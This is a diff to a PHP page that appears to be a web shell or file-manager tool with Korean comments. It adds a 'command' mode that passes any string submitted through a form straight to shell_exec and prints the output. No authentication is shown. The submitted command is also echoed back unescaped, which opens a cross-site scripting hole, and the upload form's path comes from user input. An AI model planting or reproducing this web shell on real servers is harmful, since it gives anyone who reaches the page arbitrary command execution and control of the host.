@@ -323,7 +323,7 @@
         
         <?php  } else if($mode == "fileUpload") { ?>
             <!-- 파일 업로드 시에는 post가 맞지만, enctype까지 정해주어야함. -->
-            <form action="<?php echo $page ?>?mode=fileUpload&path=<?php echo $path ?>" method="POST" enctype="multipart/form-data">
+            <form action="<?php echo $page ?>?mode=fileUpload" method="POST" enctype="multipart/form-data">
                 <div class="input-group">
                     <span class="input-group-addon">Upload Path</span>
                     <input type="text" class="form-control" placeholder = "Path Input..." name="path" value="<?php echo $path ?>">
@@ -338,17 +338,30 @@
                     <p class="help-block">위의 Upload Path 경로로 업로드가 됩니다.</p>
                     <p class="text-center"><button class="btn btn-default" type="submit">File Upload</button></p>
                 </div>
-        </form>
+            </form>
+        <?php  } else if($mode == "command") { ?>
+            <form action="<?php echo $page ?>?mode=command" method="POST">
+                <div class="input-group">
+                    <span class="input-group-addon">Command</span>
+                    <input type="text" class="form-control" placeholder = "Command Input..." name="command" value="<?php echo isset($_POST["command"]) ? $_POST["command"] : ''; ?>">
+                    <span class="input-group-btn">
+                    </span>
+                </div>
+                <br>
+                <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></p>
+            </form>
+                <?php
+                    if(!empty($_POST["command"])){
+                        echo "<hr>";
+                        $result = shell_exec($_POST["command"]);
+                        $result = str_replace("\n", "<br>", $result);
+                        // $result = iconv("CP949", "UTF-8", $result); //원래 인코딩값, 변경할 인코딩값, 대상  -> 맥북에서는 안 됨.
+                        echo $result;
+                    }
 
-
-
-
-
+                ?>
+            
         <?php } ?>
-
-
-
-
         <hr>
         <p class="text-muted text-center">Copyright© 2025, Vak-kas, All rights reserved.</p>
     </div>
